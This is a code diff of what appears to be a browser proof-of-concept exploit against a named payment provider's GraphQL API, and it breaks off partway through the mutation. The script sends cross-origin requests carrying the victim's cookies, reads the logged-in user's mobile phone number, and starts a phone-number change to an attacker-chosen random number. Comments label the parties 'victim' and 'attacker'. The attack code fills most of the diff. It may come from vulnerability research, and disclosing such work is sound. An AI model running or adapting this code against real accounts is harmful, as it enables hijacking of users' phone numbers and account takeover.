@@ -21,35 +21,38 @@
   const log = t => document.getElementById('log').textContent += t + '\n';
   document.getElementById('origin').textContent = location.origin;
 
+  // helper to generate +33 6XXXXXXXX (8 random digits)
+  const randMobile = () => '+336' + String(Math.floor(10000000 + Math.random()*90000000));
+
   async function gql(path, query) {
-    const res = await fetch(`https://api.swan.io${path}`, {
-      method:  'POST',
+    const r = await fetch(`https://api.swan.io${path}`, {
+      method: 'POST',
       credentials: 'include',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ query })
     });
-    const txt = await res.text();
-    log(`=== ${path} ===\nStatus: ${res.status} ${res.statusText}\n${txt}\n`);
+    const txt = await r.text();
+    log(`=== ${path} ===\nStatus: ${r.status} ${r.statusText}\n${txt}\n`);
     return JSON.parse(txt).data;
   }
 
   (async () => {
-    // 1) Try to read the victim's number
-    let oldN = '+33600000002';
+    // 1) Try to read real phone
+    let oldN = null;
     const whoami = await gql('/admin-auth/graphql', '{ user { mobilePhoneNumber } }');
     if (whoami && whoami.user && whoami.user.mobilePhoneNumber) {
       oldN = whoami.user.mobilePhoneNumber;
       log(`✅ Read victim’s phone: ${oldN}\n`);
     } else {
-      log(`⚠️ Could not read phone (not logged in) – using dummy: ${oldN}\n`);
+      oldN = randMobile();
+      log(`⚠️ Could not read phone – using random dummy: ${oldN}\n`);
     }
 
-    // 2) Generate a valid new number: +33 6 XXXXXXXX (8 digits)
-    const rand8 = () => Math.floor(10000000 + Math.random() * 90000000);
-    const newN = '+336' + String(rand8());
+    // 2) Generate attacker-chosen new number
+    const newN = randMobile();
     log(`▶ Attempting change from ${oldN} → ${newN}\n`);
 
-    // 3) Queue the phone-change mutation
+    // 3) Fire the mutation
     const mutation = `
       mutation {
         startPhoneNumberModification(input:{
